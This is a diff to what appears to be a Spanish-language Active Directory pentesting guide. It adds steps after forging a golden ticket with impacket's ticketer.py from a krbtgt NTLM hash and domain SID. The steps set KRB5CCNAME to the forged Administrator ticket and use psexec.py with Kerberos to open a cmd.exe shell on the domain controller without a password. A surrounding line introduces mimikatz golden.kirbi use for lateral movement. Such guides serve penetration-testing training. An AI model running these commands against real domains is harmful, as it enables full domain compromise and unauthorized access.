@@ -15,6 +15,16 @@ ticketer.py -nthash <hash_NTLM> -domain-sid <sid_krbtgt> -domain <dominio> <nomb
 ```
 [Ver ejemplo](Images/users/README.md)
 
+Tenemos que exportar una variable de entorno con la ruta del ticket.
+```
+export KRB5CCNAME="/home/kali/Desktop/AD/Administrador.ccache"
+```
+Ahora con `psexec` podemos conectar directamente al DC sin proporcionar contraseña de la siguiente forma:
+```
+psexec.py -n -k <dominio>/<domain_admin>@<nombre_DC> cmd.exe
+```
+[Ver ejemplo](Images/sesion/README.md)
+
 # Movimiento Lateral
 Podemos crear un `golden.kirbi` para cargarlo con mimikatz en una máquina y ganar privilegios de acceso a un equipo, para ello en una sesión de mimikatz haremos lo siguiente:
 ```
